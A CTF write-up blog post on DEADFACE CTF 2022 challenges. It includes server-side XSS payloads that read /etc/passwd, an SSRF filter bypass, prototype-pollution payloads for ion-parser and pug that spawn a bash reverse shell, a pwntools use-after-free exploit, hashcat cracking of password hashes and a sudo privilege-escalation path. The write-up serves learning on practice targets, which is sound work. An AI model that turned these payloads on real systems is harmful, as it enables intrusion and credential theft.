@@ -1,0 +1,435 @@
+---
+title: "DEADFACE CTF 2022 Writeup"
+date: "2022-10-19"
+tags: ['Writeup']
+draft: false
+summary: "Another writeup for the really interesting CTF game I played last weekend! Luckily to find a prototype pollution challenge in the game."
+---
+
+Another writeup for the really interesting CTF game I played last weekend! Luckily to find a prototype pollution challenge in the game.
+
+
+
+### Web
+
+#### Invoice
+
+>De Monne Financial has had the admin panel to their accounts payable site accessed. It should only be accessible to the internal network. Can you help figure out how the Ghost Town hackers got access and what information was leaked?
+>
+>Access /admin on the site. `invoice.deadface.io:3000`
+
+Here we got a web page where you can submit the information about the invoice and will receive a generated PDF as the invoice.
+![invoice-1](/static/images/DEADFACE-CTF-2022-Writeup/invoice-1.png)
+
+My intuition told me that there would be an XSS vulnerability, so I tried a few commands to trigger the server-side XSS. After I wrote the following payload in the description box, I got a return with `xss?` in it, which means our script has been executed.
+
+```
+<script>document.write('xss?')</script>
+```
+
+![invoice-2](/static/images/DEADFACE-CTF-2022-Writeup/invoice-2.png)
+
+Next, let's lead to an arbitrary file reading on the server side. Before doing that, we should first confirm the current path of the execution environment.
+
+```
+<script>document.write(window.location)</script>
+```
+
+![invoice-3](/static/images/DEADFACE-CTF-2022-Writeup/invoice-3.png)
+
+Now, we confirm that the javascript is executed under `/tmp`, and it is not a node environment but a browser-like environment. So, we should use `get` request to read the sensitive files on the server. 
+
+```
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+```
+
+![invoice-4](/static/images/DEADFACE-CTF-2022-Writeup/invoice-4.png)
+
+No flags here? Let's take a look at the challenge description, which says that the flag is in /admin, which cannot be accessed remotely. So, it would be an SSRF vulnerability.
+
+When I tried to use the following payload, it said that our input had Illegal characters, which means they filtered the `localhost` and `127.0.0.1`
+
+```
+<iframe src="http://localhost:3000/admin"></iframe>
+<iframe src="http://127.0.0.1:3000/admin"></iframe>
+```
+
+I found a way to bypass the black list, which is replacing the `localhost` with `0.0.0.0`. And it works!
+
+![invoice-5](/static/images/DEADFACE-CTF-2022-Writeup/invoice-5.png)
+
+Here are some useful references related to this challenge:
+
++ https://gaowebsec.readthedocs.io/zh/latest/vuln/ssrf.html
+
++ https://highon.coffee/blog/ssrf-cheat-sheet/
+
++ https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
+
+#### DFRS
+
+>De Monne Financial has launched a prototype of their De Monne Financial Records System. This system was compromised by DEADFACE. They were able to access the /admin page somehow.
+>
+>Access /admin
+>[http://dfrsproto.deadface.io:3001](http://dfrsproto.deadface.io:3001/)
+
+This is a typical prototype pollution vulnerability exploitation challenge that results in an RCE. During the competition, we were blind with the server-side code besides a package-lock.json provided on the ghosttown.deadface.io server.
+
+However, it suggests that the server-side logic would be easy to guess. Firstly, let's check the given package-lock.json to see if the application uses any package with a known vulnerability.
+
+![dfrs-1](/static/images/DEADFACE-CTF-2022-Writeup/dfrs-1.png)
+
+Just as expected, the application uses the ion-parser package to parse the user input to generate the Javascript object, which is prone to a prototype pollution vulnerability if it doesn't sanitize carefully. 
+
+![dfrs-2](/static/images/DEADFACE-CTF-2022-Writeup/dfrs-2.png)
+
+And on the server side, the user input would generate an object shown below.
+
+```
+{
+	"user": {
+		name: "admin",
+		password: "admin"
+	}
+}
+```
+
+Therefore, we could pollute the `Object.prototype` by the parser function call. However, the story is far from over. We need to leverage the prototype pollution to somewhere more dangerous, like RCE. It just so happens that I've recently been working on a threat model for this kind of vulnerability.
+
+![ppaeg-task-modeling](/static/images/DEADFACE-CTF-2022-Writeup/ppaeg-task-modeling.png)
+
+After we are able to pollute the prototype, we need to find gadgets inside the code that read our inject value from the `Object.prototype` and carry it to an execution context. There are universal gadgets that can be used to carry out RCE. Plz, find them with [this link](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-vuln-child_process-functions).
+
+If the application calls the functions from the `child_process,` such as `spawn`, `fork`, or `exec`. Then, we could pollute several properties to make use of the gadgets in the Node.js standard library.
+
+```
+title = "userData"
+
+[user]
+name = "admin"
+password = "admin"
+
+[user.__proto__]
+argv0 = "require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)//"
+shell = "/proc/self/exe"
+NODE_OPTIONS = "--require /proc/self/cmdline"
+```
+
+Surprise! it works. However, it is not the intention of this challenge. This challenge is designed to guide us to find the gadgets inside the template engine rather than the universal gadgets. From the `package-lock.json`, we could find that it uses the `pug` template engine. 
+
+Template engine in Javascript is really powerful in that it reads the engine-specific strings and dynamically generates a Javascript function that can be used to render an HTML. The logic behind it provides a perfect environment for injecting code execution. What if we can inject the code inside the process of template parsing and compilation and expect it would become a part of the returned function?
+
+There is a great code snippet that we could make use of. The property `line` of the `node` object could be undefined, which would lead to a lookup of the Object.prototype. If we could pollute the `node.line` with our malicious code, it would be added to the `buf`. And the `buf` variable is exactly the body of the return function that will be evaluated as the code. 
+
+```javascript
+//node_moudles/pug-code-gen/index.js
+    if (debug && node.debug !== false && node.type !== 'Block') {
+      if (node.line) {
+        var js = ';pug_debug_line = ' + node.line;
+        if (node.filename)
+          js += ';pug_debug_filename = ' + stringify(node.filename);
+        this.buf.push(js + ';');
+      }
+    }
+```
+
+However, injecting a node in the AST tree while the parser also needs another prototype property being polluted. This would be called a polluted chain. To generate the AST tree, the pug parser would walk through the existing AST tree and try to adjust the tree(merge nodes inside a block node). And we could see that there might be another Object.prototype property lookup for the block property when the current `ast.type` is one of the `Tag`, `Code`, and so on. So, it would give us a chance to inject a block object in the AST tree and add the nodes as we expect.
+
+```javascript
+// node_moudles/pug/index.js
+function walkAST(/* */){
+
+/* */
+
+switch (ast.type) {
+    case 'NamedBlock':
+    case 'Block':
+      ast.nodes = walkAndMergeNodes(ast.nodes);
+      break;
+    case 'Case':
+    case 'Filter':
+    case 'Mixin':
+    case 'Tag':
+    case 'InterpolatedTag':
+    case 'When':
+    case 'Code':
+    case 'While':
+      if (ast.block) {
+        ast.block = walkAST(ast.block, before, after, options);
+      }
+      break;
+    case 'Each':
+      if (ast.block) {
+        ast.block = walkAST(ast.block, before, after, options);
+      }
+      if (ast.alternate) {
+        ast.alternate = walkAST(ast.alternate, before, after, options);
+      }
+      break;
+    case 'EachOf':
+      if (ast.block) {
+        ast.block = walkAST(ast.block, before, after, options);
+      }
+      break;
+
+/* */
+
+}
+```
+
+So, the final exploit for leveraging the gadgets inside the pug template server is shown below.
+
+```
+title = "userData"
+
+[user]
+name = "admin"
+password = "admin"
+
+
+[user.__proto__.block]
+type = "Text",
+line = "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
+```
+
+And finally, you could get this hard-earned flag as a reward:
+
+```
+flag{pr0t0TypE-PollUti0n-AST-Inj3Ction}
+```
+
+### Pwn
+
+#### Easy Creds
+
+> We were going through password dumps and we found a password hash associated with an email address that `crypto_vamp` uses. See if you can crack the hash and find his password.
+>
+> Password: `$6$xyz$mNc63Q/k4GOeih/lF4YFzMKrJQc31yjwQ8pBIJ8.Q2Bo/2RgiMXohuVfg/O8xUx3ENTpAEk0N1eEhU5J6VwA/0`
+
+Check the password at: https://www.dcode.fr/cipher-identifier.
+
+![](/static/images/DEADFACE-CTF-2022-Writeup/ezcred-2.png)
+
+![](/static/images/DEADFACE-CTF-2022-Writeup/ezcred-3.png)
+
+```
+$6$xyz$mNc63Q/k4GOeih/lF4YFzMKrJQc31yjwQ8pBIJ8.Q2Bo/2RgiMXohuVfg/O8xUx3ENTpAEk0N1eEhU5J6VwA/0:123456789q
+```
+
+#### Database crack
+
+>We did it! We managed to get a copy of a password database from `deephax`. Can you crack the password to get into the database and see what things lie within?
+
+https://atinfosec.medium.com/nahamcon-ctf-easy-keesy-challenge-write-up-b739ac337347
+
+![database-1](/static/images/DEADFACE-CTF-2022-Writeup/database-1.png)
+
+Luckily, we could get the hash value of the password that stores in the kdbx file.
+
+![database-2](/static/images/DEADFACE-CTF-2022-Writeup/database-2.png)
+
+Next, let's try to crack the hash value with `hashcat` again!
+
+```
+hashcat -a 0 -m 13400 -o output.txt mypassword.txt /usr/share/wordlists/rockyou.txt
+```
+
+I decided to use the GPU to speed up the process. Then, you should install `hascat-nvidia` instead.
+
+![database-2](/static/images/DEADFACE-CTF-2022-Writeup/database-3.png)
+
+However, this time rockyou.txt didn't work. So I tried a few other password lists, including `john.lst`, `nmap.lst`, `wifite.txt`, `frasttrack.txt`. 
+
+And finally, I got the correct password which is from the smallest dictionary—frasttrack.txt!
+
+![database-5](/static/images/DEADFACE-CTF-2022-Writeup/database-5.png)
+
+```
+$keepass$*2*60000*0*b8bb35396aa2cc7b81c8d1e68ef3baf23d20f781406946c280230d100173e739*63e6afc61de486d9855f0696918acfb2b6f59593d98f1fb23c6b41bb045ec0b4*e8c1e5981c84aa4f52be41271efaba41*3c567f9f005c33c0342e943ed1e37d343fa7215b103a6bfd9278ac4c265de41e*5f4030232f25e16e767fb31fbf7b69458f274f651659719dfa99fa1fe66715f5:complexpassword
+```
+
+![database-6](/static/images/DEADFACE-CTF-2022-Writeup/database-6.png)
+
+#### Exploit Checker
+
+>DEADFACE is running a service to allow their members to check whether exploits are compatible with chosen targets. They are also using it to store a key they are using to enable `c2c` updates on exploited hosts. We have gotten an old copy of the binary, but the password to access the admin key and the admin key have changed.
+>
+>Retrieve the admin key from the remote service running on: `exploitchecker.deadface.io:1337`
+>
+>The flag will be in format: `flag{.*}`.
+>
+>[Download File](https://tinyurl.com/8mw4tv8z)
+>SHA1: `df974c9af308a6d95788bcc7691230bb186cc404`
+
+This is an easy heap UAF vulnerability challenge, where we are able to create two different types of structure, i.e. exploit, target, and compare their compatibility. Meanwhile, we are also able to delete the structure we created by the following code snippet.
+
+![checker-2](/static/images/DEADFACE-CTF-2022-Writeup/checker-2.png)
+
+Here is the issue: the programmer uses the `free` function to recycle the memory space to the heap management, and this memory space can be allocated to the next malloc request(if the space size is the same). However, the pointer that refers to the deleted structure is not assigned to a null pointer, indicating that we could also use this pointer to visit the released memory space.
+
+First of all, let's see how do the two structures look like.
+
+![checker-2](/static/images/DEADFACE-CTF-2022-Writeup/checker-4.png)
+
+![checker-6](/static/images/DEADFACE-CTF-2022-Writeup/checker-6.png)
+
+So, we expect that S1 and S2 could share the same heap memory space so that we could use the arch and os values of S2 to rewrite the function pointer of S1, and jump to the address we want instead of the delete_structure function. 
+
+In the following code snippet, we could find that when we enter 0x32(2) into the command line, if the pointer to S1 is not null, the program calls the address `S1+0x10`.  
+
+![checker-3](/static/images/DEADFACE-CTF-2022-Writeup/checker-3.png)
+
+So our actions would be like: 1(create S1), 2(delete S1), 3(create S2), and 2(delete S1). And since the program has a magic code segment to send the flag to the client side. We just need to jump to that address and make sure the register and stack have the correct value to call the final `send` function.
+
+![checker-7](/static/images/DEADFACE-CTF-2022-Writeup/checker-7.png)
+
+Finally, we could receive the flag on the client side.
+
+![checker-1](/static/images/DEADFACE-CTF-2022-Writeup/checker-1.png)
+
+Here is the Exp:
+
+```
+sh.recvuntil(b"6: Exit\n")
+""" 
+Make the first Target
+"""
+sh.send(b'1\n')
+sh.recvline(b'What is the hostname?')
+sh.send(b'AAAA\n')
+sh.recvline(b'What is the architecture?')
+sh.send(b'AA\n')
+sh.recvline(b'What is the os?')
+sh.send(b'AA\n')
+
+sh.recvuntil(b"6: Exit\n")
+"""
+Free the first Target
+"""
+sh.send(b'2\n')
+
+sh.recvuntil(b"6: Exit\n")
+"""
+Make the An Exploit and overwrite the delete_structure address
+"""
+sh.send(b'3\n')
+
+target_address_h = 2052 #0x0804
+target_address_l = 35781 #0x8bc5
+
+sh.recvline(b'What is the name of the exploit?')
+sh.send(b'AAAAAAAAAAAAAAA')
+sh.recvline(b'What is the architecture?')
+sh.send(b'35781\n')
+sh.recvline(b'What is the os?')
+sh.send(b'2052\n')
+sh.recvline(b'What is the version?')
+sh.send(b'AA\n')
+sh.recvline(b'What is the type?')
+sh.send(b'AA\n')
+
+sh.recvuntil(b"6: Exit\n")
+print('Begin to exploit!')
+"""
+Exploit the UAF vulnerability
+"""
+sh.send(b'2\n')
+
+print("[+]\033[32m Look what we got: %s \033[0m" % sh.recvuntil(b'}\n'))
+```
+
+#### Grave Digger 1&2&3
+
+**Grave Digger 1**
+
+>Turbo Tactical has gained access to a machine owned by DEADFACE. It appears `crypto_vamp`, a new recruit at DEADFACE, used a weak password for his account on `d34th`'s machine. See if you can find the flag associated with "Grave Digger 1"`env.deadface.io`
+>Password: `123456789q`
+
+![gravedigger-1](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-1.png)
+
+**Grave Digger 2**
+
+>A member of DEADFACE has a sensitive file on `d34th`'s machine. See if you can find a way to read the `gravedigger2` file. Submit the flag as `flag{flag text}`.
+>
+>env.deadface.io Password: `123456789q`
+>
+>*Use context from **Grave Digger 1***
+
+![gravedigger-2](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-2.png)
+
+When I am confronted with a privilege escalation task, the first technique off my head is always leveraging the command that is given the `SUID` privilege. However, none of them can be used to read a file.
+
+![gravedigger-3](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-3.png)
+
+Then, I check the kernel version to see if it has vulnerabilities. It turns out that the server installed the latest ubuntu, which means that the kernel vulnerabilities are not something we should expect.
+
+However, following the [checklist](https://book.hacktricks.xyz/linux-hardening/privilege-escalation), I found that the `sudo -l` could show which binaries the current user has access to run.
+
+![gravedigger-4](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-4.png)
+
+Surprisingly, it shows that we can run `/opt/reader` binary without a password.
+
+![gravedigger-5](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-5.png)
+
+Finally, we can get the flag from the QR code.
+
+**Grave Digger 3**
+
+> There is one more flag that DEADFACE has hidden on `d34th`'s machine. Somehow, you'll have to find a way to access `d34th`'s files in his home directory. Submit the flag as `flag{flag text}`
+>
+> env.deadface.io Password: `123456789q`
+
+![gravedigger-6](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-6.png)
+
+From the second gravedigger 2, we found that user `crypto_vamp` may run the /opt/reader code as the user `lilith`. For now, we found that /opt/reader can be used to execute a command. So we could make use of both of things together and get an shell of user `lilith`.
+
+```
+sudo -u lilith /opt/reader -c bash
+```
+
+![gravedigger-7](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-7.png)
+
+And then, we could find that `lilith` is able to run `/usr/bin/base64` as all users, including the root user. And the base64 command is able for us to read a file which means that we are now able to read all the files that a root user could read.
+
+![gravedigger-8](/static/images/DEADFACE-CTF-2022-Writeup/gravedigger-8.png)
+
+So, let's read the `.bash_history` file of user `spookyboi`. And finally we got a link to get the flag.
+
+```
+flag{b4d_h1sTOrY}
+```
+
+By the way, this website provides a great summary of what linux commands could do to bypass the security restriction and achieve malicious actions: https://gtfobins.github.io/
+
+### Stego
+
+#### Life's a Glitch
+
+> Another one of De Monne's employees was compromised. DEADFACE left a GIF image of what looks like a glitched face. They claim there is a flag in the GIF. See if you can use your repertoire of tools to find the flag hidden in the GIF.
+>
+> [Download Image](https://tinyurl.com/2kzdbxe2)
+> sha1: `07e8b1366c80da00e00380aafbc5664ddf6c4cfd`
+
+Separate the gif into frames and find the flag.
+
+![glitchedout](/static/images/DEADFACE-CTF-2022-Writeup/glitch-1.jpg)
+
+However, the flag is hard to read. So, we need to play around with this image. Since the given file is a gif, we could use the image frame without the flag text. According to their differences, we could find the flag more clearly.
+
+![glitchedout](/static/images/DEADFACE-CTF-2022-Writeup/glitch-2.png)
+
+```
+# import module
+from PIL import Image, ImageChops
+  
+# assign images
+img1 = Image.open("glitchedout.jpg")
+img2 = Image.open("ori-glitchedout.jpg")
+  
+# finding difference
+diff = ImageChops.difference(img1, img2)
+  
+# showing the difference
+diff.save("diff.png")
+```
+
